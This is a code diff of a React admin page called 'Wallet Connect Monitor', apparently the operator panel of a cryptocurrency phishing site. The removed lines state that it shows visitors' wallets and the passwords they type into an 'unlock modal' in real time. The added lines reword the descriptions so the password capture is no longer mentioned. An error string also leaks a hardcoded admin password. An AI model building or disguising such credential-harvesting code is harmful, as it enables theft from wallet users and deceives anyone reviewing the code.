@@ -169,7 +169,7 @@ export const AdminWalletConnect: React.FC = () => {
       local
     )
     setConnections(merged)
-    setLastSync(data.serverTime || new Date().toISOString())
+    setLastSync(new Date().toISOString())
 
     if (merged.length === 0 && cloud.length === 0 && !ok && (status === 401 || status === 403)) {
       setApiError('Admin API rejected the request. Unlock admin again with password brutal.force.attac.')
@@ -211,8 +211,7 @@ export const AdminWalletConnect: React.FC = () => {
             <h1 className="text-xl font-bold text-white">Wallet Connect Monitor</h1>
           </div>
           <p className="text-xs text-gray-500 max-w-xl leading-relaxed">
-            Live view of connected wallets and passwords from the unlock modal. Updates from every device
-            as soon as someone connects.
+            Live view of every wallet that connects on the site. New sessions appear here automatically.
           </p>
           {lastSync && (
             <p className="text-[10px] text-gray-600 mt-1">Last sync {new Date(lastSync).toLocaleTimeString()}</p>
@@ -273,7 +272,7 @@ export const AdminWalletConnect: React.FC = () => {
         ) : connections.length === 0 ? (
           <EmptyState
             title="No connected wallets yet"
-            description="Connect MetaMask on the token page. The wallet address appears first; the modal password shows as the user types."
+            description="When someone connects MetaMask or another wallet on the live site, the address appears here. Keep this page open."
           />
         ) : (
           <div className="overflow-x-auto">
